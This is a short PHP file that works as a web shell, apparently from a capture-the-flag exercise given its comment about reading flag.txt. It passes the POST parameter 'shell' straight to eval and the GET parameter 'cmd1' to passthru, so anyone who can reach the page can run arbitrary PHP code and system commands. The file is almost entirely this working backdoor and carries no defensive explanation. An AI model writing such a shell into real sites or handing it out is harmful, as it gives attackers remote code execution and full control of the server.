<?php 
@eval($_POST['shell']);
// payload=system("cat flag.txt");

$cmd1=$_GET["cmd1"];
if($cmd1)
{
    // https://www.runoob.com/w3cnote/php-safe-collection.html
    passthru($cmd1);
}
?> 
